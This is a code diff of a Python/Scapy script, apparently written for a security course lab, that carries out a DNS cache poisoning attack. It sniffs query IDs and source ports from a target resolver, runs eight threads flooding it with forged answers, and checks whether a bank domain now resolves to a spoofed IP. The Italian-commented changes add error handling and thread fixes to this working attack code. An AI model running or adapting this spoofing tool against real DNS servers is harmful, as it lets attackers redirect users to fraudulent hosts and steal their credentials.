@@ -26,7 +26,8 @@ PORT_NUMBER = 0         # porta da catturare
 
 
 GOAL = 0                # va a 1 se riesco nell'attacco
-RESTART = 0             # settata a 1 dal bad_client se ottiene risposta 10.0.0.1 (cioè no poisoning)
+RESTART = 0             # settata a 1 dal bad_client se ottiene risposta 10.0.0.1, cioe' no poisoning
+ERRORI = 0              # condizione di uscita per failure
 
 class FirstThread(Thread):
 
@@ -37,27 +38,26 @@ class FirstThread(Thread):
                 self.flood = flood
 
         def run(self):
-                #print ("Thread '" + self.name + "' avviato")
+                print ("Thread '" + self.name + "' avviato")
                 # time.sleep(self.durata)
 
                 if self.job == 0:                                                       # sniffer
                         sniffer_job()
-                        #print ("Thread '" + self.name + "' terminato")
 
                 if self.job == 1:                                                       # sender
                         time.sleep(1)
                         sender_job()
-                        #print ("Thread '" + self.name + "' terminato")
 
                 if self.job == 2:                                                       # bad client
                         sender_job_2()
-                        #print ("Thread '" + self.name + "' terminato")
 
                 if self.job == 3:                                                       # flooder
                         flooding_job(self.flood)
 
                 if self.job == 4:                                                       # in ascolto per il secret
                         secret_job()
+
+                print ("Thread '" + self.name + "' terminato")
 
 
 
@@ -76,8 +76,12 @@ def sniffer_job():
         catturo query ID e numero di porta
         :return:
         '''
+        global Q_ID
+        global PORT_NUMBER
         #pkts = sniff(count=4, timeout=3, filter="src host 192.168.56.101 and dst host 192.168.56.1 and dst port 53", prn=lambda x: x.summary())
         #pkts = sniff(count=4, timeout=2, filter="src host 192.168.56.101 and dst host 192.168.56.1 and dst port 53", lfilter=lambda pkt: pkt.haslayer(DNS))
+        filtro = "src host " + VULN_DNS_IP + " and dst host " + BAD_DNS_IP + " and dst port 53"
+        print filtro
         pkts = sniff(count=4, timeout=2,
                      filter="src host " + VULN_DNS_IP + " and dst host " + BAD_DNS_IP + " and dst port 53",
                      lfilter=lambda pkt: pkt.haslayer(DNS))
@@ -93,9 +97,12 @@ def sender_job_2():
         :return:
         '''
 
+        global GOAL
+        global RESTART
+
         response = sr1(IP(dst=VULN_DNS_IP) / UDP() / DNS(rd=1, qd=DNSQR(qname="bankofallan.co.uk")))
         # TODO valutare se an o ar e togliere la print
-        print response[0].getlayer(DNS).an.rdata
+        print "response on spoof is: " + str(response[0].getlayer(DNS).an.rdata)
         if response[0].getlayer(DNS).an.rdata == DNS_SPOOF_IP:
                 RESTART = 1
         else:
@@ -107,6 +114,9 @@ def flooding_job(passo):
         :param passo:
         :return:
         '''
+
+        global Q_ID
+        global PORT_NUMBER
 
         '''
         # build the packet
@@ -155,22 +165,31 @@ def secret_job():
 
 
 
-############################ MAIN ##################à
+############################ MAIN ###########################
 # TODO start del thread in ascolto su 1337 prima degli altri
 
-def main_job():
+def master_job():
         '''
-        - il bad client e i  flooders devono partire sulla stessa condizione (cioè qID e PORT diversi da 0)
+        - il bad client e i  flooders devono partire sulla stessa condizione (cioe' qID e PORT diversi da 0)
         :return:
         '''
 
+        global ERRORI
+        global GOAL
+        global Q_ID
+        global PORT_NUMBER
+        global RESTART
 
-        while GOAL == 0:
+        #listener_thread = FirstThread(name="listener", job=4, flood=None)
+        #listener_thread.start()
+
+
+        while GOAL == 0 and ERRORI < 3:
                 RESTART = 0
 
                 # Creazione dei thread
-                sniffer_thread = FirstThread(name="sniffer", job=0)
-                first_sender_thread = FirstThread(name="first sender", job=1)
+                sniffer_thread = FirstThread(name="sniffer", job=0, flood=None)
+                first_sender_thread = FirstThread(name="first sender", job=1, flood=None)
                 sniffer_thread.start()
                 first_sender_thread.start()
                 sniffer_thread.join()
@@ -181,19 +200,18 @@ def main_job():
 
                 if (Q_ID == 0 or PORT_NUMBER == 0):
                         print '[MAIN] error on qID or port'
-                        pass
+                        ERRORI = ERRORI + 1
+                        continue
 
-                bad_client_thread = FirstThread(name="bad client", job=2)
+                bad_client_thread = FirstThread(name="bad client", job=2, flood=None)
                 flooder_0 = FirstThread(name="flood0", job=3, flood=0)
                 flooder_1 = FirstThread(name="flood1", job=3, flood=1)
                 flooder_2 = FirstThread(name="flood2", job=3, flood=2)
                 flooder_3 = FirstThread(name="flood3", job=3, flood=3)
-                flooder_4 = FirstThread(name="flood3", job=3, flood=4)
-                flooder_5 = FirstThread(name="flood3", job=3, flood=5)
-                flooder_6 = FirstThread(name="flood3", job=3, flood=6)
-                flooder_7 = FirstThread(name="flood3", job=3, flood=7)
-
-
+                flooder_4 = FirstThread(name="flood4", job=3, flood=4)
+                flooder_5 = FirstThread(name="flood5", job=3, flood=5)
+                flooder_6 = FirstThread(name="flood6", job=3, flood=6)
+                flooder_7 = FirstThread(name="flood7", job=3, flood=7)
 
                 # TODO sinconia tra bad client e flooders
                 bad_client_thread.start()
@@ -206,8 +224,6 @@ def main_job():
                 flooder_6.start()
                 flooder_7.start()
 
-
-
                 bad_client_thread.join()
                 flooder_0.join()
                 flooder_1.join()
@@ -218,4 +234,13 @@ def main_job():
                 flooder_6.join()
                 flooder_7.join()
 
-        print "Goal reached."
+        if GOAL == 1:
+                print "Goal reached."
+
+        else:
+                print "too many errors."
+
+
+        #listener_thread.join()
+
+master_job()
